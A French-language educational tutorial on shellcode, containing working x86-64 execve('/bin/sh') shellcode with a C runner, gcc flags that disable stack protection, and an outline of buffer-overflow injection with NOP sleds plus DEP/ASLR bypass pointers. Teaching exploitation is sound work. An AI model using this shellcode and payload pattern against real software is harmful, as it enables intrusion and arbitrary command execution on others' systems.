# Shellcode

Le shellcode est du code machine injectable qui exécute des commandes arbitraires. En exploitation, on injecte du shellcode dans un buffer puis on redirige l'exécution vers celui-ci pour obtenir un shell ou exécuter des actions malveillantes.

⚠️ AVERTISSEMENT : Code éducatif. Uniquement sur tes propres systèmes de test. Usage malveillant est ILLÉGAL.

```c
// Shellcode x86-64 execve("/bin/sh")
unsigned char shellcode[] =
    "\x48\x31\xf6"              // xor rsi, rsi
    "\x56"                      // push rsi
    "\x48\xbf\x2f\x62\x69\x6e"  // movabs rdi, '/bin/sh'
    "\x2f\x2f\x73\x68"
    "\x57"                      // push rdi
    "\x54"                      // push rsp
    "\x5f"                      // pop rdi
    "\x6a\x3b"                  // push 0x3b (execve)
    "\x58"                      // pop rax
    "\x99"                      // cdq
    "\x0f\x05";                 // syscall

// Exécuter le shellcode
((void(*)())shellcode)();
```

## Compilation

```bash
gcc -fno-stack-protector -z execstack -no-pie example.c -o example
./example
```

## Concepts clés

- Shellcode = code machine brut (opcodes) exécutable
- Doit être position-independent (pas d'adresses absolues)
- Éviter les null bytes (\x00) qui terminent les strings
- NOP sled (\x90) pour augmenter la zone d'atterrissage
- Injection via buffer overflow puis saut vers le buffer

## Exploitation

Le shellcode s'injecte via un buffer overflow. On place le shellcode dans le buffer, puis on écrase la return address pour pointer vers le début du buffer (ou dans un NOP sled).

Un NOP sled est une séquence de NOPs (\x90) avant le shellcode. Si on atterrit n'importe où dans le NOP sled, l'exécution "glisse" jusqu'au shellcode. Payload typique : NOP*200 + shellcode + padding + adresse_buffer.

Les systèmes avec DEP/NX marquent la stack comme non-exécutable. Il faut alors utiliser return-to-libc ou ROP. Avec ASLR, il faut leak l'adresse du buffer ou utiliser des techniques de brute-force.

Générer du shellcode : msfvenom, pwntools, ou écrire en assembleur puis extraire les opcodes avec objdump.

## Outils

- msfvenom : générateur de shellcode (Metasploit)
- pwntools : framework Python avec shellcraft
- nasm : assembleur pour écrire du shellcode custom
- objdump : extraire les opcodes d'un binaire
